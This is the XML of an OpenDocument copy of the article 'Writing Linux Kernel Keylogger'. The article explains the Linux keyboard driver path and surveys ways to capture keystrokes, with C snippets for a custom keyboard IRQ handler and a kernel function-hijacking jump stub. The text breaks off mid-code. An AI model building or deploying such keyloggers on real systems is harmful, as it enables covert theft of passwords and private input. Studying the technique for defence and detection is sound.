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Gill Sans Bold" svg:font-family="'Gill Sans Bold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use-window-font-color="true" style:font-name="Gill Sans" fo:font-size="11pt" style:font-name-asian="ArialMT" style:font-size-asian="11pt" style:font-name-complex="ArialMT" style:font-size-complex="11pt"/>
    </style:style>
    <style:style style:name="P2" style:family="paragraph" style:parent-style-name="Standard" style:list-style-name="L1">
      <style:paragraph-properties fo:text-align="justify" style:justify-single-word="false" style:text-autospace="none"/>
      <style:text-properties style:use-window-font-color="true" style:font-name="Gill Sans" fo:font-size="11pt" style:font-name-asian="ArialMT" style:font-size-asian="11pt" style:font-name-complex="ArialMT" style:font-size-complex="11pt"/>
    </style:style>
    <style:style style:name="P3" style:family="paragraph" style:parent-style-name="Standard" style:list-style-name="L2">
      <style:paragraph-properties fo:text-align="justify" style:justify-single-word="false" style:text-autospace="none"/>
      <style:text-properties style:use-window-font-color="true" style:font-name="Gill Sans" fo:font-size="11pt" style:font-name-asian="ArialMT" style:font-size-asian="11pt" style:font-name-complex="ArialMT" style:font-size-complex="11pt"/>
    </style:style>
    <style:style style:name="P4" style:family="paragraph" style:parent-style-name="Standard" style:list-style-name="L5">
      <style:paragraph-properties fo:text-align="justify" style:justify-single-word="false" style:text-autospace="none"/>
      <style:text-properties style:use-window-font-color="true" style:font-name="Gill Sans" fo:font-size="11pt" style:font-name-asian="ArialMT" style:font-size-asian="11pt" style:font-name-complex="ArialMT" style:font-size-complex="11pt"/>
    </style:style>
    <style:style style:name="P5" style:family="paragraph" style:parent-style-name="Standard" style:list-style-name="L6">
      <style:paragraph-properties fo:text-align="justify" style:justify-single-word="false" style:text-autospace="none"/>
      <style:text-properties style:use-window-font-color="true" style:font-name="Gill Sans" fo:font-size="11pt" style:font-name-asian="ArialMT" style:font-size-asian="11pt" style:font-name-complex="ArialMT" style:font-size-complex="11pt"/>
    </style:style>
    <style:style style:name="P6" style:family="paragraph" style:parent-style-name="Standard" style:list-style-name="L7">
      <style:paragraph-properties fo:text-align="justify" style:justify-single-word="false" style:text-autospace="none"/>
      <style:text-properties style:use-window-font-color="true" style:font-name="Gill Sans" fo:font-size="11pt" style:font-name-asian="ArialMT" style:font-size-asian="11pt" style:font-name-complex="ArialMT" style:font-size-complex="11pt"/>
    </style:style>
    <style:style style:name="P7" style:family="paragraph" style:parent-style-name="Standard">
      <style:paragraph-properties fo:text-align="center" style:justify-single-word="false" style:text-autospace="none"/>
      <style:text-properties style:use-window-font-color="true" style:font-name="Gill Sans" fo:font-size="11pt" style:font-name-asian="ArialMT" style:font-size-asian="11pt" style:font-name-complex="ArialMT" style:font-size-complex="11pt"/>
    </style:style>
    <style:style style:name="P8" style:family="paragraph" style:parent-style-name="Standard">
      <style:paragraph-properties fo:text-align="justify" style:justify-single-word="false" style:text-autospace="none"/>
      <style:text-properties style:use-window-font-color="true" style:font-name="Gill Sans" fo:font-size="11pt" fo:font-weight="bold" style:font-name-asian="ArialMT" style:font-size-asian="11pt" style:font-weight-asian="bold" style:font-name-complex="ArialMT" style:font-size-complex="11pt" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P9" style:family="paragraph" style:parent-style-name="Standard" style:list-style-name="L4">
      <style:paragraph-properties fo:text-align="justify" style:justify-single-word="false" style:text-autospace="none"/>
      <style:text-properties style:use-window-font-color="true" style:font-name="Gill Sans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 style:list-style-name="L5">
      <style:paragraph-properties fo:text-align="justify" style:justify-single-word="false" style:text-autospace="none"/>
      <style:text-properties style:use-window-font-color="true" style:font-name="Gill Sans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1" style:family="paragraph" style:parent-style-name="Standard" style:list-style-name="L8">
      <style:paragraph-properties fo:text-align="justify" style:justify-single-word="false" style:text-autospace="none"/>
      <style:text-properties style:use-window-font-color="true" style:font-name="Gill Sans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2" style:family="paragraph" style:parent-style-name="Standard">
      <style:paragraph-properties fo:text-align="center" style:justify-single-word="false" style:text-autospace="none"/>
      <style:text-properties style:use-window-font-color="true" style:font-name="Gill Sans" fo:font-size="14pt" style:font-name-asian="ArialMT" style:font-size-asian="14pt" style:font-name-complex="ArialMT" style:font-size-complex="14pt"/>
    </style:style>
    <style:style style:name="P13" style:family="paragraph" style:parent-style-name="Standard">
      <style:paragraph-properties fo:text-align="justify" style:justify-single-word="false" style:text-autospace="none"/>
      <style:text-properties style:use-window-font-color="true" style:font-name="Gill Sans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style:use-window-font-color="true" style:font-name="Gill Sans" fo:font-size="10pt" fo:font-style="italic" fo:font-weight="bold" style:font-name-asian="ArialMT" style:font-size-asian="10pt" style:font-style-asian="italic" style:font-weight-asian="bold" style:font-name-complex="ArialMT" style:font-size-complex="10pt" style:font-style-complex="italic" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P15" style:family="paragraph" style:parent-style-name="Standard" style:list-style-name="L3">
      <style:paragraph-properties fo:text-align="justify" style:justify-single-word="false" style:text-autospace="none"/>
      <style:text-properties style:use-window-font-color="true" style:font-name="Gill Sans"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P16" style:family="paragraph" style:parent-style-name="Standard">
      <style:paragraph-properties fo:text-align="justify" style:justify-single-word="false" style:text-autospace="none"/>
      <style:text-properties style:use-window-font-color="true" style:font-name="Gill Sans" fo:font-size="10pt" style:font-name-asian="ArialMT" style:font-size-asian="10pt" style:font-name-complex="ArialMT" style:font-size-complex="10pt"/>
    </style:style>
    <style:style style:name="P17" style:family="paragraph" style:parent-style-name="Standard">
      <style:paragraph-properties fo:text-align="justify" style:justify-single-word="false" style:text-autospace="none"/>
      <style:text-properties style:use-window-font-color="true" style:font-name="Gill Sans" fo:font-size="9pt" fo:font-weight="bold" style:font-name-asian="ArialMT" style:font-size-asian="9pt" style:font-weight-asian="bold" style:font-name-complex="ArialMT" style:font-size-complex="9pt" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P18" style:family="paragraph" style:parent-style-name="Standard">
      <style:paragraph-properties fo:text-align="justify" style:justify-single-word="false" style:text-autospace="none"/>
      <style:text-properties style:use-window-font-color="true" style:font-name="Gill Sans" fo:font-size="9pt" style:font-name-asian="ArialMT" style:font-size-asian="9pt" style:font-name-complex="ArialMT" style:font-size-complex="9pt"/>
    </style:style>
    <style:style style:name="P19" style:family="paragraph" style:parent-style-name="Standard">
      <style:paragraph-properties fo:text-align="justify" style:justify-single-word="false" style:text-autospace="none"/>
      <style:text-properties style:use-window-font-color="true" style:font-name="Gill Sans" fo:font-size="9pt" fo:font-weight="normal" style:font-name-asian="ArialMT" style:font-size-asian="9pt" style:font-weight-asian="normal" style:font-name-complex="ArialMT" style:font-size-complex="9pt" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P20" style:family="paragraph" style:parent-style-name="Standard" style:list-style-name="L2">
      <style:paragraph-properties fo:text-align="justify" style:justify-single-word="false" style:text-autospace="none"/>
    </style:style>
    <style:style style:name="P21" style:family="paragraph" style:parent-style-name="Standard" style:list-style-name="L9">
      <style:paragraph-properties fo:text-align="justify" style:justify-single-word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 style:list-style-name="L10">
      <style:paragraph-properties fo:text-align="justify" style:justify-single-word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in" fo:margin-right="0in" fo:text-align="justify" style:justify-single-word="false" fo:text-indent="0.4984in" style:auto-text-indent="false" style:text-autospace="none"/>
      <style:text-properties style:use-window-font-color="true" style:font-name="Gill Sans" fo:font-size="9pt" fo:font-weight="bold" style:font-name-asian="ArialMT" style:font-size-asian="9pt" style:font-weight-asian="bold" style:font-name-complex="ArialMT" style:font-size-complex="9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.4984in" style:auto-text-indent="false" style:text-autospace="none"/>
      <style:text-properties style:use-window-font-color="true" style:font-name="Gill Sans" fo:font-size="11pt" style:font-name-asian="ArialMT" style:font-size-asian="11pt" style:font-name-complex="ArialMT" style:font-size-complex="11pt"/>
    </style:style>
    <style:style style:name="P25" style:family="paragraph" style:parent-style-name="Standard">
      <style:paragraph-properties fo:margin-left="0in" fo:margin-right="0in" fo:text-align="justify" style:justify-single-word="false" fo:text-indent="0.5134in" style:auto-text-indent="false" style:text-autospace="none"/>
      <style:text-properties style:use-window-font-color="true" style:font-name="Gill Sans" fo:font-size="9pt" fo:font-style="italic" fo:font-weight="bold" style:font-name-asian="ArialMT" style:font-size-asian="9pt" style:font-style-asian="italic" style:font-weight-asian="bold" style:font-name-complex="ArialMT" style:font-size-complex="9pt" style:font-style-complex="italic" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P26" style:family="paragraph" style:parent-style-name="Standard">
      <style:paragraph-properties fo:margin-left="0in" fo:margin-right="0in" fo:text-align="justify" style:justify-single-word="false" fo:text-indent="0.5209in" style:auto-text-indent="false" style:text-autospace="none"/>
      <style:text-properties style:use-window-font-color="true" style:font-name="Gill Sans" fo:font-size="9pt" fo:font-style="italic" fo:font-weight="bold" style:font-name-asian="ArialMT" style:font-size-asian="9pt" style:font-style-asian="italic" style:font-weight-asian="bold" style:font-name-complex="ArialMT" style:font-size-complex="9pt" style:font-style-complex="italic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.5063in" style:auto-text-indent="false" style:text-autospace="none"/>
      <style:text-properties style:use-window-font-color="true" style:font-name="Gill Sans" fo:font-size="9pt" fo:font-weight="normal" style:font-name-asian="ArialMT" style:font-size-asian="9pt" style:font-weight-asian="normal" style:font-name-complex="ArialMT" style:font-size-complex="9pt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.4909in" style:auto-text-indent="false" style:text-autospace="none"/>
      <style:text-properties style:use-window-font-color="true" style:font-name="Gill Sans" fo:font-size="9pt" fo:font-weight="normal" style:font-name-asian="ArialMT" style:font-size-asian="9pt" style:font-weight-asian="normal" style:font-name-complex="ArialMT" style:font-size-complex="9pt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Gill Sans" fo:font-size="9pt" fo:font-weight="normal" style:font-name-asian="ArialMT" style:font-size-asian="9pt" style:font-weight-asian="normal" style:font-name-complex="ArialMT" style:font-size-complex="9pt" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P30" style:family="paragraph" style:parent-style-name="Frame_20_contents">
      <style:paragraph-properties fo:text-align="justify" style:justify-single-word="false"/>
      <style:text-properties style:font-name="Gill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1" style:family="paragraph">
      <style:paragraph-properties fo:text-align="center"/>
      <style:text-properties style:font-name="Gill Sans Bold" fo:font-size="9pt" fo:font-weight="normal" style:font-size-asian="9pt" style:font-weight-asian="normal" style:font-size-complex="9pt" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P32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Gill Sans" fo:font-size="11pt" style:font-name-asian="ArialMT" style:font-size-asian="11pt" style:font-name-complex="ArialMT" style:font-size-complex="11pt"/>
    </style:style>
    <style:style style:name="T3" style:family="text">
      <style:text-properties style:use-window-font-color="true" style:font-name="Gill Sans" fo:font-size="11pt" fo:font-weight="bold" style:font-name-asian="ArialMT" style:font-size-asian="11pt" style:font-weight-asian="bold" style:font-name-complex="ArialMT" style:font-size-complex="11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font-weight-asian="bold"/>
    </style:style>
    <style:style style:name="T14" style:family="text">
      <style:text-properties style:font-weight-complex="bold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Gill Sans"/>
    </style:style>
    <style:style style:name="T17" style:family="text">
      <style:text-properties style:font-name-asian="ArialMT"/>
    </style:style>
    <style:style style:name="T18" style:family="text">
      <style:text-properties style:font-name-complex="ArialMT"/>
    </style:style>
    <style:style style:name="T19" style:family="text">
      <style:text-properties style:font-style-asian="italic"/>
    </style:style>
    <style:style style:name="T20" style:family="text">
      <style:text-properties style:font-style-complex="italic"/>
    </style:style>
    <style:style style:name="T21" style:family="text">
      <style:text-properties style:font-name="Gill Sans Bold"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fo:padding="0in" fo:border="none" style:shadow="none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.3in">
          <style:column-sep style:width="0.0008in" style:color="#000000" style:height="100%"/>
          <style:column style:rel-width="4818*" fo:start-indent="0in" fo:end-indent="0.15in"/>
          <style:column style:rel-width="4819*" fo:start-indent="0.15in" fo:end-indent="0in"/>
        </style:columns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prefix=" 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fill-color="#cccc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">Writting Linux Kernel Keylogger</text:span></text:p>
      <text:p text:style-name="P7"><text:span text:style-name="T9">Revisão, Formatação e Adaptação por Ubiratan Soares (Agosto de 2009</text:span>)</text:p>
      <text:p text:style-name="P1"/>
      <text:p text:style-name="P1"/>
      <text:p text:style-name="P8">Contents</text:p>
      <text:list xml:id="list764584939" text:style-name="L1">
        <text:list-header>
          <text:p text:style-name="P2"/>
        </text:list-header>
        <text:list-item>
          <text:p text:style-name="P2">Introduction</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P2">How Linux keyboard driver work</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P2">Kernel based keylogger approaches</text:p>
          <text:list>
            <text:list-item>
              <text:p text:style-name="P2">Interrupt handler</text:p>
            </text:list-item>
            <text:list-item>
              <text:p text:style-name="P2">Function hijacking</text:p>
            </text:list-item>
            <text:list-item>
              <text:p text:style-name="P2">handle_scancode</text:p>
            </text:list-item>
            <text:list-item>
              <text:p text:style-name="P2">put_queue</text:p>
            </text:list-item>
            <text:list-item>
              <text:p text:style-name="P2">receive_buf</text:p>
            </text:list-item>
            <text:list-item>
              <text:p text:style-name="P2">tty_read</text:p>
            </text:list-item>
            <text:list-item>
              <text:p text:style-name="P2">sys_read/sys_write</text:p>
            </text:list-item>
          </text:list>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P2">vlogger</text:p>
          <text:list>
            <text:list-item>
              <text:p text:style-name="P2">The syscall/tty approach</text:p>
            </text:list-item>
            <text:list-item>
              <text:p text:style-name="P2">Features</text:p>
            </text:list-item>
            <text:list-item>
              <text:p text:style-name="P2">How to use</text:p>
            </text:list-item>
          </text:list>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P2">Greets</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P2">References</text:p>
        </text:list-item>
      </text:list>
      <text:p text:style-name="P1"/>
      <text:p text:style-name="P8">1 - Introduction</text:p>
      <text:p text:style-name="P1"/>
      <text:p text:style-name="P1"><text:tab/>This article is divided into two parts. <text:s/>The first part of the paper gives an overview on how the linux keyboard driver work, and discusses methods that can be used to create a kernel based keylogger. <text:s/>This part</text:p>
      <text:p text:style-name="P1">will be useful for those who want to write a kernel based keylogger, or to write their own keyboard driver (for supporting input of non-supported language in linux environment) or to program taking advantage of many features in the Linux keyboard driver.</text:p>
      <text:p text:style-name="P1"/>
      <text:p text:style-name="P1"><text:tab/>The second part presents detail of <text:span text:style-name="T4">vlogger,</text:span> a smart kernel based linux keylogger, and how to use it. <text:s/>Keylogger is a very interesting code being used widely in honeypots, hacked systems, by white and black hats. <text:s/>As most of us known, besides user space keyloggers (such as <text:span text:style-name="T9">iob, uberkey, unixkeylogger</text:span>), there are some kernel based keyloggers. <text:s/>The earliest kernel based keylogger is linspy of halflife which was published in Phrack50 (see [4]). <text:s/>And the recent keylogger is presented in 'Kernel Based Keylogger' paper by mercenary (see [7]) that I found when was writing this paper. <text:s/>The common method of those kernel based keyloggers using is to log user keystrokes by intercepting <text:span text:style-name="T9">sys_read</text:span> or <text:span text:style-name="T9">sys_write</text:span> system call.</text:p>
      <text:p text:style-name="P1"/>
      <text:p text:style-name="P1"><text:tab/>However, this approach is quite unstable and slowing down the whole system noticeably because <text:span text:style-name="T9">sys_read</text:span> (or <text:span text:style-name="T9">sys_write</text:span>) is the generic read/write function of the system; <text:span text:style-name="T9">sys_read</text:span> is called whenever a process wants to read something from devices (such as keyboard, file, serial port). <text:s/>In vlogger, I used a better way to implement it that hijacks the tty buffer processing function.</text:p>
      <text:p text:style-name="P1"/>
      <text:p text:style-name="P1"><text:tab/>The reader is supposed to possess the knowledge on Linux Loadable Kernel Module. <text:s/>Articles [1] and [2] are recommended to read before further reading.</text:p>
      <text:p text:style-name="P1"/>
      <text:p text:style-name="P1"/>
      <text:p text:style-name="P8">2 - How Linux keyboard driver work</text:p>
      <text:p text:style-name="P1"/>
      <text:p text:style-name="P1"><text:tab/>Lets take a look at below figure to know how user inputs from console keyboard are processed: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style-name="gr1" draw:text-style-name="P31" svg:width="1.176in" svg:height="0.4614in" svg:x="2.539in" svg:y="0.0244in"><text:p text:style-name="P31"><text:span text:style-name="T21">handle_scan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1"/>
      <text:p text:style-name="P1"><draw:line text:anchor-type="paragraph" draw:z-index="5" draw:style-name="gr2" draw:text-style-name="P32" svg:x1="3.0965in" svg:y1="0.1339in" svg:x2="3.0965in" svg:y2="0.7673in"><text:p/></draw:line></text:p>
      <text:p text:style-name="P1"><draw:frame draw:style-name="fr1" draw:name="Frame1" text:anchor-type="paragraph" svg:x="2.2638in" svg:y="0.1043in" svg:width="0.6402in" draw:z-index="9"><draw:text-box fo:min-height="0.2571in"><text:p text:style-name="P30">put_queue</text:p></draw:text-box></draw:frame></text:p>
      <text:p text:style-name="P1"/>
      <text:p text:style-name="P1"/>
      <text:p text:style-name="P1"><draw:custom-shape text:anchor-type="paragraph" draw:z-index="1" draw:style-name="gr1" draw:text-style-name="P31" svg:width="1.176in" svg:height="0.4614in" svg:x="2.5236in" svg:y="0.0646in"><text:p text:style-name="P31"><text:span text:style-name="T21">tty_queu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6" draw:style-name="gr2" draw:text-style-name="P32" svg:x1="3.0965in" svg:y1="0.1339in" svg:x2="3.0965in" svg:y2="0.7673in"><text:p/></draw:line></text:p>
      <text:p text:style-name="P1"><draw:frame draw:style-name="fr1" draw:name="Frame2" text:anchor-type="paragraph" svg:x="2.1811in" svg:y="0.1043in" svg:width="0.8571in" draw:z-index="10"><draw:text-box fo:min-height="0.1673in"><text:p text:style-name="P30">receive_buff</text:p></draw:text-box></draw:frame></text:p>
      <text:p text:style-name="P1"/>
      <text:p text:style-name="P1"/>
      <text:p text:style-name="P1"><draw:custom-shape text:anchor-type="paragraph" draw:z-index="2" draw:style-name="gr1" draw:text-style-name="P31" svg:width="1.176in" svg:height="0.4614in" svg:x="2.5165in" svg:y="0.0472in"><text:p text:style-name="P31"><text:span text:style-name="T21">tty_ldiscbuff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7" draw:style-name="gr2" draw:text-style-name="P32" svg:x1="3.0965in" svg:y1="0.1571in" svg:x2="3.0965in" svg:y2="0.7906in"><text:p/></draw:line></text:p>
      <text:p text:style-name="P1"/>
      <text:p text:style-name="P1"><draw:frame draw:style-name="fr1" draw:name="Frame3" text:anchor-type="paragraph" svg:x="2.2638in" svg:y="0.0299in" svg:width="0.6402in" draw:z-index="11"><draw:text-box fo:min-height="0.2571in"><text:p text:style-name="P30">tty_read</text:p></draw:text-box></draw:frame></text:p>
      <text:p text:style-name="P1"/>
      <text:p text:style-name="P1"><draw:custom-shape text:anchor-type="paragraph" draw:z-index="3" draw:style-name="gr1" draw:text-style-name="P31" svg:width="1.176in" svg:height="0.4614in" svg:x="2.5016in" svg:y="0.0764in"><text:p text:style-name="P31"><text:span text:style-name="T21">/dev/tty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><draw:line text:anchor-type="paragraph" draw:z-index="8" draw:style-name="gr2" draw:text-style-name="P32" svg:x1="3.0965in" svg:y1="0.0102in" svg:x2="3.0965in" svg:y2="0.6437in"><text:p/></draw:line></text:p>
      <text:p text:style-name="P1"><draw:frame draw:style-name="fr1" draw:name="Frame4" text:anchor-type="paragraph" svg:x="2.2638in" svg:y="0.1043in" svg:width="0.6402in" draw:z-index="12"><draw:text-box fo:min-height="0.2571in"><text:p text:style-name="P30">sys_read</text:p></draw:text-box></draw:frame></text:p>
      <text:p text:style-name="P1"/>
      <text:p text:style-name="P1"><draw:custom-shape text:anchor-type="paragraph" draw:z-index="4" draw:style-name="gr1" draw:text-style-name="P31" svg:width="1.176in" svg:height="0.4614in" svg:x="2.5016in" svg:y="0.1118in"><text:p text:style-name="P31"><text:span text:style-name="T21">USER PRO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><text:tab/>First, when you press a key on the keyboard, the keyboard will send corresponding <text:span text:style-name="T4">scancodes</text:span> to <text:span text:style-name="T4">keyboard driver.</text:span> <text:s/>A single key press can produce a sequence of up to six scancodes. The <text:span text:style-name="T9">handle_scancode()</text:span> function in the keyboard driver parses the stream of scancodes and converts it into a series of key press and key release events called keycode by using a <text:span text:style-name="T4">translation-table</text:span> via <text:span text:style-name="T9">kbd_translate()</text:span> function. <text:s/>Each key is provided with a unique keycode k in the range 1-127. Pressing key k produces keycode k, while releasing it produces keycode k+128. For example, keycode of <text:span text:style-name="T10">'a'</text:span> is <text:span text:style-name="T7">30</text:span>. Pressing key 'a' produces keycode 30. Releasing 'a' produces keycode 158 (128+30).</text:p>
      <text:p text:style-name="P1"/>
      <text:p text:style-name="P1"><text:tab/>Next, keycodes are converted to key symbols by looking them up on the appropriate keymap. <text:s/>This is a quite complex process. There are eight possible modifiers (s<text:span text:style-name="T9">hift keys - Shift , AltGr, Control, Alt, ShiftL,</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T9">ShiftR, CtrlL and CtrlR</text:span>), and the combination of currently active modifiers and locks determines the keymap used.</text:p>
      <text:p text:style-name="P1"/>
      <text:p text:style-name="P1"><text:tab/>After the above handling, the obtained characters are put into the <text:span text:style-name="T4">raw tty queue</text:span> – <text:span text:style-name="T9">tty_flip_buffer</text:span>. In the tty line discipline, <text:span text:style-name="T9">receive_buf()</text:span> function is called periodically to get characters from <text:span text:style-name="T9">tty_flip_buffer</text:span> then put them into tty read queue. When user process want to get user input, it calls <text:span text:style-name="T9">read() </text:span>function on stdin of the process. <text:span text:style-name="T5">sys_read()</text:span> function will calls <text:span text:style-name="T9">read()</text:span> function defined in file_operations structure (which is pointed to <text:span text:style-name="T9">tty_read</text:span>) of corresponding tty (example <text:span text:style-name="T9">/dev/tty0</text:span>) to read input characters and return to the process.</text:p>
      <text:p text:style-name="P1"/>
      <text:p text:style-name="P1"><text:tab/>The keyboard driver can be in one of 4 modes:</text:p>
      <text:p text:style-name="P1"/>
      <text:list xml:id="list1825214152" text:style-name="L2">
        <text:list-item>
          <text:p text:style-name="P20"><text:span text:style-name="T3">scancode</text:span><text:span text:style-name="T2"> (RAW MODE): the application gets scancodes for input. It is used by applications that implement their own keyboard driver (like X11)</text:span></text:p>
          <text:p text:style-name="P3"/>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P3"><text:span text:style-name="T7">keycode</text:span> (MEDIUMRAW MODE): the application gets information on which keys (identified by their keycodes) get pressed and released.</text:p>
          <text:p text:style-name="P3"/>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P3"><text:span text:style-name="T7">ASCII</text:span> (XLATE MODE): the application effectively gets the characters as defined by the keymap, using an 8-bit encoding.</text:p>
          <text:p text:style-name="P3"><text:soft-page-break/></text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P3"><text:span text:style-name="T7">Unicode</text:span> (UNICODE MODE): this mode only differs from the ASCII mode by allowing the user to compose UTF8 unicode characters by their decimal value, using Ascii_0 to Ascii_9, or their hexadecimal (4-digit) value, using Hex_0 to Hex_9. <text:s/>A keymap can be set up to produce UTF8 sequences (with a U+XXXX pseudo-symbol, where each X is an hexadecimal digit). </text:p>
        </text:list-item>
      </text:list>
      <text:p text:style-name="P1"/>
      <text:p text:style-name="P1"><text:tab/>Those modes influence what type of data that applications will get as keyboard input. <text:s/>For more details on scancode, keycode and keymaps, please read [3].</text:p>
      <text:p text:style-name="P1"/>
      <text:p text:style-name="P8">3 - Kernel based keylogger approaches</text:p>
      <text:p text:style-name="P1"/>
      <text:p text:style-name="P1"><text:tab/>We can implement a kernel based keylogger in two ways by writing our own keyboard interrupt handler or hijacking one of input processing functions. </text:p>
      <text:p text:style-name="P1"/>
      <text:p text:style-name="P1"/>
      <text:p text:style-name="P13">3.1 - Interrupt handler</text:p>
      <text:p text:style-name="P1"/>
      <text:p text:style-name="P1"><text:tab/>To log keystrokes, we will use our own keyboard interrupt handler. <text:s/>Under Intel architectures, the IRQ of the keyboard controlled is IRQ 1. When receives a keyboard interrupt, our own keyboard interrupt handler read the scancode and keyboard status. <text:s/>Keyboard events can be read and written via port 0x60(Keyboard data register) and 0x64(Keyboard status register).</text:p>
      <text:p text:style-name="P1"><draw:frame draw:style-name="fr2" draw:name="Frame5" text:anchor-type="paragraph" svg:x="0.1799in" svg:y="0.1701in" svg:width="6.2953in" draw:z-index="13"><draw:text-box fo:min-height="2.3535in"><text:list xml:id="list1482152272" text:style-name="L3"><text:list-header><text:p text:style-name="P15"/></text:list-header><text:list-item><text:p text:style-name="P15">/* below code is intel specific */</text:p></text:list-item><text:list-item><text:p text:style-name="P15">#define KEYBOARD_IRQ 1 </text:p></text:list-item><text:list-item><text:p text:style-name="P15">#define KBD_STATUS_REG 0x64 </text:p></text:list-item><text:list-item><text:p text:style-name="P15">#define KBD_CNTL_REG 0x64 </text:p></text:list-item><text:list-item><text:p text:style-name="P15">#define KBD_DATA_REG 0x60 </text:p></text:list-item><text:list-item><text:p text:style-name="P15"/></text:list-item><text:list-item><text:p text:style-name="P15">#define kbd_read_input() inb(KBD_DATA_REG) </text:p></text:list-item><text:list-item><text:p text:style-name="P15">#define kbd_read_status() inb(KBD_STATUS_REG) </text:p></text:list-item><text:list-item><text:p text:style-name="P15">#define kbd_write_output(val) outb(val, KBD_DATA_REG) </text:p></text:list-item><text:list-item><text:p text:style-name="P15">#define kbd_write_command(val) outb(val, KBD_CNTL_REG) </text:p></text:list-item><text:list-item><text:p text:style-name="P15"/></text:list-item><text:list-item><text:p text:style-name="P15">/* register our own IRQ handler */</text:p></text:list-item><text:list-item><text:p text:style-name="P15">request_irq(KEYBOARD_IRQ, my_keyboard_irq_handler, 0, "my keyboard", NULL);</text:p></text:list-item></text:list><text:p text:style-name="P1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In <text:span text:style-name="T5">my_keyboard_irq_handler()</text:span>:</text:p>
      <text:p text:style-name="P1"><text:tab/><text:tab/><text:span text:style-name="T9">scancode = kbd_read_input()</text:span>; </text:p>
      <text:p text:style-name="P1"><text:tab/><text:tab/><text:span text:style-name="T9">key_status = kbd_read_status()</text:span>; </text:p>
      <text:p text:style-name="P1"><text:tab/><text:tab/><text:span text:style-name="T9">log_scancode(scancode)</text:span>;</text:p>
      <text:p text:style-name="P1"/>
      <text:p text:style-name="P1"><text:tab/>This method is platform dependent. <text:s/>So it won't be portable among platforms. <text:s/>And you have to be very careful with your interrupt handler if you don't want to crash your box.</text:p>
      <text:p text:style-name="P1"/>
      <text:p text:style-name="P13">3.2 - Function hijacking</text:p>
      <text:p text:style-name="P1"/>
      <text:p text:style-name="P1"><text:tab/>Based on the Figure 1, we can implement our keylogger to log user inputs by hijacking one of <text:span text:style-name="T9">handle_scancode()</text:span>, <text:span text:style-name="T9">put_queue(),</text:span> <text:span text:style-name="T9">receive_buf()</text:span>, <text:span text:style-name="T9">tty_read()</text:span> and <text:span text:style-name="T9">sys_read()</text:span> functions. <text:s/>Note that we can't intercept <text:span text:style-name="T9">tty_insert_flip_char()</text:span> function because it is an INLINE function.</text:p>
      <text:p text:style-name="P1"/>
      <text:p text:style-name="P1"/>
      <text:p text:style-name="P14">3.2.1 - handle_scancode</text:p>
      <text:p text:style-name="P1"/>
      <text:p text:style-name="P1"><text:tab/>This is the entry function of the keyboard driver (see <text:span text:style-name="T4">keyboard.c</text:span>). <text:s/>It handles scancodes which are received from keyboard.</text:p>
      <text:p text:style-name="P1"/>
      <text:p text:style-name="P13"><text:soft-page-break/># /usr/src/linux/drives/char/keyboard.c</text:p>
      <text:p text:style-name="P13">void handle_scancode(unsigned char scancode, int down);</text:p>
      <text:p text:style-name="P1"/>
      <text:p text:style-name="P1"><text:tab/>We can replace original handle_scancode() function with our own to logs all scancodes. <text:s/>But <text:span text:style-name="T9">handle_scancode()</text:span> function is not a global and exported function. <text:s/>So to do this, we can use kernel function hijacking technique introduced by Silvio (see [5]).</text:p>
      <text:p text:style-name="P1"/>
      <text:p text:style-name="P1"><draw:frame draw:style-name="fr2" draw:name="Frame6" text:anchor-type="paragraph" svg:x="0.1799in" svg:y="0.0929in" svg:width="6.2953in" draw:z-index="14"><draw:text-box fo:min-height="2.3535in"><text:list xml:id="list1671999043" text:continue-numbering="true" text:style-name="L3"><text:list-header><text:p text:style-name="P15"/></text:list-header></text:list><text:list xml:id="list406388482" text:style-name="L4"><text:list-item><text:p text:style-name="P9">/* below is a code snippet written by Plasmoid */</text:p></text:list-item><text:list-item><text:p text:style-name="P9">static struct semaphore hs_sem, log_sem;</text:p></text:list-item><text:list-item><text:p text:style-name="P9">static int logging=1;</text:p></text:list-item><text:list-item><text:p text:style-name="P9"/></text:list-item><text:list-item><text:p text:style-name="P9">#define CODESIZE 7</text:p></text:list-item><text:list-item><text:p text:style-name="P9">static char hs_code[CODESIZE];</text:p></text:list-item><text:list-item><text:p text:style-name="P9">static char hs_jump[CODESIZE] =</text:p></text:list-item><text:list-item><text:p text:style-name="P9"><text:s text:c="7"/>"\xb8\x00\x00\x00\x00" <text:s text:c="5"/>/* <text:s text:c="5"/>movl <text:s text:c="2"/>$0,%eax <text:s/>*/</text:p></text:list-item><text:list-item><text:p text:style-name="P9"><text:s text:c="7"/>"\xff\xe0" <text:s text:c="17"/>/* <text:s text:c="5"/>jmp <text:s text:c="3"/>*%eax <text:s text:c="3"/>*/</text:p></text:list-item><text:list-item><text:p text:style-name="P9"><text:s text:c="3"/>;</text:p></text:list-item><text:list-item><text:p text:style-name="P9"/></text:list-item><text:list-item><text:p text:style-name="P9">void (*handle_scancode) (unsigned char, int) =</text:p></text:list-item><text:list-item><text:p text:style-name="P9"><text:s text:c="8"/>(void (*)(unsigned char, int)) HS_ADDRESS;</text:p></text:list-item><text:list-item><text:p text:style-name="P9"/></text:list-item><text:list-item><text:p text:style-name="P9">void _handle_scancode(unsigned char scancode, int keydown)</text:p></text:list-item><text:list-item><text:p text:style-name="P9">{</text:p></text:list-item><text:list-item><text:p text:style-name="P9"><text:s text:c="7"/>if (logging &amp;&amp; keydown)</text:p></text:list-item><text:list-item><text:p text:style-name="P9"><text:s text:c="10"/>log_scancode(scancode, LOGFILE);</text:p></text:list-item><text:list-item><text:p text:style-name="P9"><text:s text:c="4"/></text:p></text:list-item><text:list-item><text:p text:style-name="P9"><text:s text:c="7"/>/*</text:p></text:list-item><text:list-item><text:p text:style-name="P9"><text:s text:c="8"/>* Restore first bytes of the original 